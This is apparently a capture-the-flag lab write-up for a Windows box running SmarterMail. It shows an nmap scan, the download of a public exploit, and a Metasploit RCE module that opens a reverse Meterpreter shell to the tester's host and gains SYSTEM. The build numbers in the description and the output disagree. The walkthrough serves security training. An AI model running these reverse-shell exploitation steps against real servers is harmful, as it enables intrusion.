# CTF Writeup: Algernon

## Lab Description

This lab demonstrates exploiting a remote code execution vulnerability in SmarterMail build 6985 to gain SYSTEM-level access on a Windows server. Learners will identify the application version, leverage an RCE exploit, and use a reverse shell payload to compromise the target. This lab emphasizes web application exploitation and highlights the risks of unpatched software.

---

## Reconaissance

An initial scan revealed following informations about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.122.65         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 15:12 EDT
Warning: 192.168.122.65 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.122.65
Host is up (0.027s latency).
Not shown: 65489 closed tcp ports (reset), 32 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 11-01-25  11:46AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_11-01-25  11:46AM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Sat, 01 Nov 2025 19:16:09 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/1%OT=21%CT=1%CU=31779%PV=Y%DS=4%DC=T%G=Y%TM=69065C8
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=1
OS:05%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=4%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578
OS:NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)EC
OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-01T19:16:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.89 ms 192.168.45.1
2   29.31 ms 192.168.45.254
3   30.83 ms 192.168.251.1
4   30.99 ms 192.168.122.65

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.16 seconds
```

The webpage running port 9998 seems very interesting it's hosting an service called "SmarterMail".

Let's try to find an version somehow or enumerate public exploits.

Found an RCE PoC for SmarterMail, let's download it.

```
wget https://www.exploit-db.com/raw/49216
```

As usual those PoC's didn't seem to work.

Navigated to metasploit. Searched up for smarter mail and made "use 0".

Configured the module and ran it.

```
msf exploit(windows/http/smartermail_rce) > set LHOST 192.168.45.163
LHOST => 192.168.45.163
msf exploit(windows/http/smartermail_rce) > set RHOSTS 192.168.122.65
RHOSTS => 192.168.122.65
msf exploit(windows/http/smartermail_rce) > run
[*] Started reverse TCP handler on 192.168.45.163:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product build...
[+] Target is running SmarterMail Build 6919.
[+] The target appears to be vulnerable.
[*] Sending stage (188998 bytes) to 192.168.122.65
[*] Meterpreter session 1 opened (192.168.45.163:4444 -> 192.168.122.65:49976) at 2025-11-01 15:31:51 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 1772 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.815]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Gained NT AUTHORITY\SYSTEM and retrieved proof.txt in C:\Users\Administrator\Desktop

```
4c0f1daadafd9ad407799c4c446255ae
```
